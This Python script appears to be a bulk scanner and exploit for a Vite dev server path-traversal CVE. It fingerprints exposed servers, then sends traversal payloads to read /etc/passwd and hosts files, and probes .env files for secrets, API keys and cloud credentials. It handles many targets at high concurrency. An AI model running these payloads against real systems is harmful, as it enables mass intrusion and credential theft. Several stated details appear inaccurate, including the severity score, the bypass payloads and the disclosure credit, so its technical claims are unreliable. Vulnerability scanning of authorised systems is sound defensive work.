#!/usr/bin/env python3
"""
Vite Dev Server CVE-2025-30208 — Arbitrary File Read via Path Traversal
========================================================================
Scans for exposed Vite development servers vulnerable to an unauthenticated
arbitrary file read via crafted URL path traversal (CVE-2025-30208, CVSS 9.2).

CVE-2025-30208 details:
  - Affects Vite < 6.2.3, < 6.1.2, < 6.0.12, < 5.4.15, < 4.5.10
  - The Vite dev server answers requests on all network interfaces unless
    `server.host` is explicitly set to a loopback address.
  - A remote attacker appending a crafted null-byte or URL-encoded separator
    sequence to a request path can bypass the ``/@fs/`` deny-list and read
    arbitrary files from the host filesystem — including .env files,
    private keys, and cloud-metadata endpoints.
  - CVSS v3.1 base score: 9.2 (Critical) — network-accessible, no auth.
  - Patched in Vite 4.5.10 / 5.4.15 / 6.0.12 / 6.1.2 / 6.2.3 (March 2025).
  - Disclosed by Positive Technologies; CISA awareness advisory issued.

Usage:
  # Scan a single target (active probe, reads /etc/passwd)
  python vite_path_traversal_scanner.py --target http://dev.example.com:5173

  # Detection only — no file-read probes
  python vite_path_traversal_scanner.py --target http://dev.example.com:5173 --safe

  # Bulk scan from file
  python vite_path_traversal_scanner.py --list devservers.txt --output findings.json

  # Adjust concurrency and disable TLS verification
  python vite_path_traversal_scanner.py --list devservers.txt --concurrency 50 --no-verify

References:
  - https://nvd.nist.gov/vuln/detail/CVE-2025-30208
  - https://vitejs.dev/blog/announcing-vite6#security-releases
  - https://github.com/vitejs/vite/security/advisories/GHSA-vg6x-rcgg-rjx6
  - https://github.com/advisories/GHSA-vg6x-rcgg-rjx6
"""

import asyncio
import json
import re
import sys
import argparse
from datetime import datetime, timezone
from typing import Optional

import httpx

# ── ANSI color helpers ────────────────────────────────────────────────────────

RED    = "\033[91m"
YELLOW = "\033[93m"
GREEN  = "\033[92m"
CYAN   = "\033[96m"
BOLD   = "\033[1m"
RESET  = "\033[0m"


def c(color: str, text: str) -> str:
    """Wrap text in an ANSI color code."""
    return f"{color}{text}{RESET}"


# ── Constants ─────────────────────────────────────────────────────────────────

CVE_ID        = "CVE-2025-30208"
CVSS          = "9.2"
TOOL_NAME     = "vite_path_traversal_scanner"

REQUEST_TIMEOUT = 8
SEMAPHORE_LIMIT = 30

# Vite fingerprints — present in dev-server responses
VITE_FINGERPRINTS = [
    "/@vite/client",
    "/node_modules/.vite/",
    '"vite"',
    "vite/dist/client",
    "/@react-refresh",
    "__vite_plugin",
    "x-vite-fetched",
    "vite-hot-reload",
]

# Paths to probe for Vite presence
DETECTION_PATHS = [
    "/",
    "/__vite_ping",
    "/@vite/client",
    "/index.html",
]

# Version extraction from Vite's client script and HTTP headers
VERSION_PATTERNS = [
    r'/@vite/client\?v=([0-9]+\.[0-9]+\.[0-9]+)',
    r'"version"\s*:\s*"([0-9]+\.[0-9]+\.[0-9]+)"',
    r'vite[@/]([0-9]+\.[0-9]+\.[0-9]+)',
    r'<!-- built with vite v([0-9]+\.[0-9]+\.[0-9]+)',
]

# Per-major-version patched thresholds.  A version is VULNERABLE when it is
# strictly below the corresponding patched tuple.
PATCHED_VERSIONS: dict[int, tuple[int, int, int]] = {
    4: (4, 5, 10),
    5: (5, 4, 15),
    6: (6, 2, 3),   # also covers 6.0.x (<6.0.12) and 6.1.x (<6.1.2)
}

# Path traversal payloads targeting /etc/passwd on Linux hosts.
# The %2F / %00 variants exercise the bypass described in the advisory.
TRAVERSAL_PAYLOADS = [
    # Null-byte bypass (original PoC)
    "/%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd\x00",
    # Double-URL-encode slash
    "/%252F..%252F..%252F..%252Fetc%252Fpasswd",
    # @fs bypass
    "/@fs/etc/passwd",
    "/@fs%2F..%2F..%2F..%2Fetc%2Fpasswd",
    # Windows-style (detection for mixed-OS CI environments)
    "/@fs/C:/Windows/System32/drivers/etc/hosts",
]

# Markers that confirm a successful /etc/passwd read
PASSWD_MARKERS = ["root:x:0:0", "root:*:0:0", "nobody:", "daemon:", "/bin/bash", "/bin/sh"]

# .env file content markers (useful for secret leakage finding)
ENV_MARKERS = ["SECRET", "PASSWORD", "API_KEY", "TOKEN", "DATABASE_URL", "PRIVATE_KEY", "AWS_"]

# Vite ping endpoint — always returns 200 {"ok":true} on exposed dev servers
PING_PATH = "/__vite_ping"


# ── Version helpers ───────────────────────────────────────────────────────────

def parse_version(text: str) -> Optional[tuple[int, ...]]:
    """Return the first (major, minor, patch) tuple found in *text*, or None."""
    for pat in VERSION_PATTERNS:
        m = re.search(pat, text, re.IGNORECASE)
        if m:
            try:
                return tuple(int(x) for x in m.group(1).split("."))
            except ValueError:
                pass
    return None


def is_vulnerable_version(vtuple: tuple[int, ...]) -> Optional[bool]:
    """
    Return True  — version is in a vulnerable range.
    Return False — version meets or exceeds patched threshold for its major.
    Return None  — cannot determine (major not in our map).
    """
    if not vtuple or len(vtuple) < 2:
        return None
    major = vtuple[0]
    threshold = PATCHED_VERSIONS.get(major)
    if threshold is None:
        # Major version 3 and below are EOL and unpatched; treat as vulnerable.
        if major < 4:
            return True
        return None
    return vtuple < threshold


def version_str(vtuple: Optional[tuple[int, ...]]) -> str:
    if not vtuple:
        return "unknown"
    return ".".join(str(x) for x in vtuple)


# ── HTTP helpers ──────────────────────────────────────────────────────────────

def normalize_url(url: str) -> str:
    if not url.startswith(("http://", "https://")):
        url = "http://" + url
    return url.rstrip("/")


async def safe_get(
    client: httpx.AsyncClient,
    url: str,
    *,
    timeout: float = REQUEST_TIMEOUT,
    follow_redirects: bool = True,
) -> Optional[httpx.Response]:
    """GET *url*, return response or None on any transport error."""
    try:
        return await client.get(
            url,
            timeout=timeout,
            follow_redirects=follow_redirects,
            headers={"User-Agent": "Mozilla/5.0 SecurityResearch/vite-cve-2025-30208"},
        )
    except Exception:
        return None


# ── Detection ─────────────────────────────────────────────────────────────────

async def fingerprint_vite(
    client: httpx.AsyncClient,
    base_url: str,
    semaphore: asyncio.Semaphore,
) -> dict:
    """
    Probe DETECTION_PATHS for Vite fingerprints and attempt version extraction.

    Returns a dict:
      detected       bool
      version        str | None
      version_tuple  tuple | None
      ping_ok        bool   (/__vite_ping returned 200 {"ok":true})
      source         str    (which path triggered detection)
    """
    async with semaphore:
        detected = False
        version_tuple = None
        ping_ok = False
        source = None

        # Quick ping check — fastest indicator of an exposed Vite dev server
        ping_resp = await safe_get(client, base_url + PING_PATH)
        if ping_resp and ping_resp.status_code == 200 and "ok" in ping_resp.text:
            ping_ok = True
            detected = True
            source = PING_PATH

        # Walk detection paths for fingerprints + version
        for path in DETECTION_PATHS:
            resp = await safe_get(client, base_url + path)
            if resp is None:
                continue

            body = resp.text
            # Check fingerprints
            if any(fp in body for fp in VITE_FINGERPRINTS):
                detected = True
                if source is None:
                    source = path

            # Try version extraction
            if version_tuple is None:
                vtuple = parse_version(body)
                if vtuple:
                    version_tuple = vtuple

            # Also check X-Vite-* headers
            for header_val in resp.headers.values():
                if "vite" in header_val.lower():
                    detected = True

            if detected and version_tuple:
                break

        return {
            "detected": detected,
            "version_tuple": version_tuple,
            "version": version_str(version_tuple),
            "ping_ok": ping_ok,
            "source": source,
        }


# ── Active path traversal probing ─────────────────────────────────────────────

async def probe_traversal(
    client: httpx.AsyncClient,
    base_url: str,
    semaphore: asyncio.Semaphore,
) -> dict:
    """
    Attempt path traversal payloads against the Vite dev server.

    Uses a safe target file (/etc/passwd) to confirm arbitrary file read.
    Returns dict with confirmed, payload, evidence, and severity.
    """
    async with semaphore:
        for payload in TRAVERSAL_PAYLOADS:
            url = base_url + payload
            resp = await safe_get(client, url, follow_redirects=False)
            if resp is None:
                continue

            body = resp.text

            # Check for /etc/passwd content
            if any(marker in body for marker in PASSWD_MARKERS):
                preview = body[:400].replace("\n", "\\n")
                return {
                    "confirmed": True,
                    "payload": payload,
                    "response_status": resp.status_code,
                    "target_file": "/etc/passwd",
                    "evidence_preview": preview,
                    "severity": "CRITICAL",
                }

            # Check for Windows hosts file
            if "localhost" in body and "127.0.0.1" in body and "::1" in body:
                preview = body[:400].replace("\n", "\\n")
                return {
                    "confirmed": True,
                    "payload": payload,
                    "response_status": resp.status_code,
                    "target_file": "C:/Windows/System32/drivers/etc/hosts",
                    "evidence_preview": preview,
                    "severity": "CRITICAL",
                }

        return {"confirmed": False}


async def probe_env_leak(
    client: httpx.AsyncClient,
    base_url: str,
    semaphore: asyncio.Semaphore,
) -> dict:
    """
    Probe for .env file leakage via @fs traversal — a common high-value target
    on Vite dev servers that store credentials in project root .env files.
    """
    async with semaphore:
        env_payloads = [
            "/@fs/.env",
            "/@fs%2F.env",
            "/%2F..%2F..%2F..%2F.env%00",
            "/%252F..%252F..%252F.env",
        ]
        for payload in env_payloads:
            url = base_url + payload
            resp = await safe_get(client, url, follow_redirects=False)
            if resp is None:
                continue
            if resp.status_code == 200 and any(m in resp.text for m in ENV_MARKERS):
                preview = resp.text[:300].replace("\n", "\\n")
                return {
                    "env_exposed": True,
                    "payload": payload,
                    "evidence_preview": preview,
                    "severity": "CRITICAL",
                }
        return {"env_exposed": False}


# ── Per-target orchestration ──────────────────────────────────────────────────

async def scan_target(
    client: httpx.AsyncClient,
    url: str,
    semaphore: asyncio.Semaphore,
    safe_mode: bool = False,
) -> Optional[dict]:
    """
    Full scan pipeline for a single target URL.

    1. Fingerprint Vite presence.
    2. Version-based vulnerability assessment.
    3. Active path traversal probe (unless --safe).
    4. .env file exposure probe (unless --safe).

    Returns a structured finding dict, or None if Vite was not detected.
    """
    base_url = normalize_url(url)

    # ── Step 1: Fingerprint ───────────────────────────────────────────────────
    fp = await fingerprint_vite(client, base_url, semaphore)
    if not fp["detected"]:
        return None

    result: dict = {
        "url": base_url,
        "timestamp": datetime.now(timezone.utc).isoformat(),
        "cve": CVE_ID,
        "vite_detected": True,
        "ping_ok": fp["ping_ok"],
        "version": fp["version"],
        "version_tuple": list(fp["version_tuple"]) if fp["version_tuple"] else None,
        "version_vulnerable": None,
        "risk": "MEDIUM",
        "findings": [],
    }

    # ── Step 2: Version assessment ────────────────────────────────────────────
    if fp["version_tuple"]:
        vuln = is_vulnerable_version(fp["version_tuple"])
        result["version_vulnerable"] = vuln
        if vuln is True:
            result["findings"].append({
                "type": "vulnerable_version",
                "severity": "HIGH",
                "detail": (
                    f"Vite {fp['version']} is in a vulnerable range "
                    f"(patch threshold for major {fp['version_tuple'][0]}: "
                    f"{version_str(PATCHED_VERSIONS.get(fp['version_tuple'][0]))})"
                ),
            })
            result["risk"] = "HIGH"
        elif vuln is False:
            result["findings"].append({
                "type": "patched_version",
                "severity": "INFO",
                "detail": f"Vite {fp['version']} is patched for {CVE_ID}",
            })
            result["risk"] = "LOW"
        else:
            result["findings"].append({
                "type": "version_unknown_major",
                "severity": "MEDIUM",
                "detail": (
                    f"Vite {fp['version']} — major version not in known patched-threshold map; "
                    "verify manually"
                ),
            })
    else:
        result["findings"].append({
            "type": "version_unknown",
            "severity": "MEDIUM",
            "detail": "Vite detected but version could not be determined",
        })

    # Exposed dev server is itself a HIGH finding regardless of version
    if fp["ping_ok"]:
        result["findings"].append({
            "type": "dev_server_exposed",
            "severity": "HIGH",
            "detail": (
                "Vite dev server is reachable via /__vite_ping — it should only "
                "be accessible on loopback (127.0.0.1). Public exposure is "
                "required for CVE-2025-30208 exploitation."
            ),
        })
        if result["risk"] not in ("CRITICAL",):
            result["risk"] = "HIGH"

    if safe_mode:
        result["findings"].append({
            "type": "safe_mode",
            "severity": "INFO",
            "detail": "Active file-read probes skipped (--safe mode)",
        })
        return result

    # ── Step 3: Active traversal probe ───────────────────────────────────────
    traversal = await probe_traversal(client, base_url, semaphore)
    if traversal.get("confirmed"):
        result["findings"].append({
            "type": "arbitrary_file_read_confirmed",
            "severity": "CRITICAL",
            "detail": (
                f"Arbitrary file read CONFIRMED — read {traversal['target_file']} "
                f"via payload: {traversal['payload']!r}"
            ),
            "payload": traversal["payload"],
            "target_file": traversal["target_file"],
            "response_status": traversal["response_status"],
            "evidence_preview": traversal["evidence_preview"],
        })
        result["risk"] = "CRITICAL"

    # ── Step 4: .env exposure probe ──────────────────────────────────────────
    env_result = await probe_env_leak(client, base_url, semaphore)
    if env_result.get("env_exposed"):
        result["findings"].append({
            "type": "env_file_exposed",
            "severity": "CRITICAL",
            "detail": ".env file accessible — may contain secrets, API keys, or credentials",
            "payload": env_result["payload"],
            "evidence_preview": env_result["evidence_preview"],
        })
        result["risk"] = "CRITICAL"

    return result


# ── Output / display helpers ──────────────────────────────────────────────────

SEVERITY_COLOR = {
    "CRITICAL": RED + BOLD,
    "HIGH":     YELLOW,
    "MEDIUM":   CYAN,
    "INFO":     GREEN,
    "LOW":      GREEN,
}

RISK_COLOR = {
    "CRITICAL": RED + BOLD,
    "HIGH":     YELLOW,
    "MEDIUM":   CYAN,
    "LOW":      GREEN,
}


def print_result(result: dict) -> None:
    risk  = result.get("risk", "?")
    color = RISK_COLOR.get(risk, RESET)
    sep   = "=" * 72

    print(f"\n{c(color, sep)}")
    print(f"  {c(BOLD, 'VITE FOUND')}   : {result['url']}")
    print(f"  Version      : {result.get('version', 'unknown')}")
    print(f"  Risk         : {c(color, risk)}")
    print(f"  CVE          : {CVE_ID} (CVSS {CVSS})")
    print(f"  Ping OK      : {result.get('ping_ok', False)}")

    for finding in result.get("findings", []):
        sev       = finding.get("severity", "?")
        sev_color = SEVERITY_COLOR.get(sev, RESET)
        tag       = f"[{c(sev_color, sev)}]"
        print(f"  {tag} {finding['detail']}")
        if "evidence_preview" in finding:
            print(f"       Evidence : {finding['evidence_preview'][:120]}")

    if risk == "CRITICAL":
        print(f"\n  {c(RED + BOLD, '>>> VULNERABLE TO ' + CVE_ID + ' — PATCH IMMEDIATELY <<<')}")

    print(c(color, sep))


def print_summary(
    total: int,
    findings: list[dict],
    start_ts: float,
    elapsed: float,
) -> None:
    critical = [r for r in findings if r.get("risk") == "CRITICAL"]
    high     = [r for r in findings if r.get("risk") == "HIGH"]
    medium   = [r for r in findings if r.get("risk") == "MEDIUM"]
    low      = [r for r in findings if r.get("risk") == "LOW"]

    print(f"\n{'=' * 60}")
    print(f"{c(BOLD, 'SCAN COMPLETE')} — {datetime.now(timezone.utc).strftime('%Y-%m-%d %H:%M')} UTC")
    print(f"Elapsed          : {elapsed:.1f}s")
    print(f"Targets scanned  : {total}")
    print(f"Vite detected    : {len(findings)}")
    print(f"  {c(RED + BOLD, 'CRITICAL')} (arbitrary file read confirmed) : {len(critical)}")
    print(f"  {c(YELLOW, 'HIGH')}     (vulnerable version / exposed)  : {len(high)}")
    print(f"  {c(CYAN, 'MEDIUM')}   (version unknown)               : {len(medium)}")
    print(f"  {c(GREEN, 'LOW')}      (patched)                       : {len(low)}")
    print("=" * 60)

    if critical:
        print(f"\n{c(RED + BOLD, 'CRITICAL findings (patch immediately):')}")
        for r in critical:
            print(f"  {r['url']}  (v{r.get('version', 'unknown')})")

    if high:
        print(f"\n{c(YELLOW, 'HIGH findings:')}")
        for r in high:
            print(f"  {r['url']}  (v{r.get('version', 'unknown')})")


# ── Main ──────────────────────────────────────────────────────────────────────

async def main(args: argparse.Namespace) -> list[dict]:
    targets: list[str] = []

    if args.target:
        targets.append(args.target)

    if args.list:
        try:
            with open(args.list) as fh:
                for line in fh:
                    line = line.strip()
                    if line and not line.startswith("#"):
                        targets.append(line)
        except FileNotFoundError:
            print(f"{c(RED, '[!]')} File not found: {args.list}")
            sys.exit(1)

    if not targets:
        print(f"{c(RED, '[!]')} No targets specified. Use --target or --list.")
        sys.exit(1)

    # Deduplicate while preserving order
    seen: set[str] = set()
    unique: list[str] = []
    for t in targets:
        n = normalize_url(t)
        if n not in seen:
            seen.add(n)
            unique.append(t)
    targets = unique

    print(
        f"{c(GREEN, '[*]')} Scanning {len(targets)} target(s) "
        f"for {c(BOLD, CVE_ID)} (Vite dev server arbitrary file read)"
    )
    if args.safe:
        print(f"{c(CYAN, '[*]')} Safe mode — fingerprinting only, no file-read probes")
    print()

    semaphore = asyncio.Semaphore(args.concurrency)
    findings:  list[dict] = []
    completed = 0
    start_ts  = asyncio.get_event_loop().time()

    ssl_ctx = not args.no_verify
    async with httpx.AsyncClient(verify=ssl_ctx, timeout=REQUEST_TIMEOUT) as client:
        tasks = [scan_target(client, t, semaphore, args.safe) for t in targets]

        for coro in asyncio.as_completed(tasks):
            result     = await coro
            completed += 1

            if completed % 25 == 0 or completed == len(targets):
                print(
                    f"    Progress: {completed}/{len(targets)} | "
                    f"Vite found: {len(findings)}",
                    end="\r",
                    flush=True,
                )

            if result:
                findings.append(result)
                print_result(result)

    elapsed = asyncio.get_event_loop().time() - start_ts
    print_summary(len(targets), findings, start_ts, elapsed)

    if args.output:
        # Make version_tuple JSON-serialisable (list of ints)
        for r in findings:
            if r.get("version_tuple") and not isinstance(r["version_tuple"], list):
                r["version_tuple"] = list(r["version_tuple"])
        with open(args.output, "w") as fh:
            json.dump(findings, fh, indent=2, default=str)
        print(f"\n{c(GREEN, '[*]')} Full results saved to {args.output}")

    return findings


if __name__ == "__main__":
    try:
        import urllib3  # type: ignore
        urllib3.disable_warnings()
    except ImportError:
        pass

    parser = argparse.ArgumentParser(
        prog=TOOL_NAME,
        description=f"Vite dev server {CVE_ID} — Arbitrary file read via path traversal",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=f"""
examples:
  # single target — active probe
  python {TOOL_NAME}.py --target http://dev.example.com:5173

  # safe mode — detection only, no file reads
  python {TOOL_NAME}.py --target http://dev.example.com:5173 --safe

  # bulk scan with JSON output
  python {TOOL_NAME}.py --list devservers.txt --output findings.json

  # high concurrency, ignore TLS errors
  python {TOOL_NAME}.py --list devservers.txt --concurrency 60 --no-verify --output out.json

CVE:         {CVE_ID}
CVSS:        {CVSS} (Critical)
Affected:    Vite < 6.2.3 / < 6.1.2 / < 6.0.12 / < 5.4.15 / < 4.5.10
Fixed:       Vite 6.2.3 / 6.1.2 / 6.0.12 / 5.4.15 / 4.5.10 (March 2025)
""",
    )
    parser.add_argument(
        "--target", "-t",
        metavar="URL",
        help="Single target URL (e.g. http://dev.example.com:5173)",
    )
    parser.add_argument(
        "--list", "-l",
        metavar="FILE",
        help="File containing one target URL per line",
    )
    parser.add_argument(
        "--output", "-o",
        metavar="FILE",
        help="Write findings to a JSON file",
    )
    parser.add_argument(
        "--safe", "-s",
        action="store_true",
        help="Fingerprint only — do NOT attempt file-read probes",
    )
    parser.add_argument(
        "--concurrency", "-c",
        type=int,
        default=SEMAPHORE_LIMIT,
        help=f"Maximum concurrent requests (default: {SEMAPHORE_LIMIT})",
    )
    parser.add_argument(
        "--no-verify",
        action="store_true",
        help="Disable TLS certificate verification (for self-signed certs)",
    )

    args = parser.parse_args()
    asyncio.run(main(args))
